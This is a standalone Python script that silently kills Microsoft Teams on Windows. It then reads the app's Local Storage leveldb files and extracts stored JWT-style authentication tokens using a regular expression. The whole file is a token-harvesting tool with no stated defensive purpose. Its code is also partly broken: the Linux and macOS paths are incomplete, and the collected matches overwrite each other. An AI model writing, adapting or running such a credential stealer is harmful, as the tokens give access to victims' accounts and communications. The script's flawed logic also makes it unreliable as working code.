#!/usr/bin/python3
import re
import os
import platform
import subprocess


# Functions
def get_teams_storage(system):
    env = os.environ
    teams_dir = ""

    match system:
        case "Linux":
            teams_dir += '/.config/Microsoft/Microsoft Teams/Local Storage/leveldb'
        case "Windows":
            subprocess.run(["powershell.exe", "Stop-Process -Name Teams -ErrorAction SilentlyContinue | Out-Null"])
            teams_dir += env['USERPROFILE']
            teams_dir += '\\AppData\\Roaming\\Microsoft\\Teams\\Local Storage\\leveldb'
        case "Darwin":
            teams_dir +=  '/Library/Application Support/Microsoft/Teams/Local Storage/leveldb'

    return teams_dir


def get_teams_tokens():
    # Variables
    tokens = {}
    generic_regex = "\w*\.\w*\.\w*"
    token_regex = "ey\w*\.\w*\.\w*"
    system = platform.system()

    # Get the local storage
    local_storage_path = get_teams_storage(system)
    os.chdir(local_storage_path)

    # Look for active tokens across all files 
    dir_files = os.listdir()
    for file in dir_files:

        # Get the file contents
        teams_file = open(file, 'rb')

        # Convert all bytes into ascii and pushinto string
        teams_binary = bytearray(teams_file.read())
        file_string = str(teams_binary, 'utf-8', errors="ignore")

        # Close the file, to be nice.
        teams_file.close()

        # Find all matches against the generic regex
        matches = re.findall(token_regex, file_string)

        if matches:
            tokens = matches

    return tokens
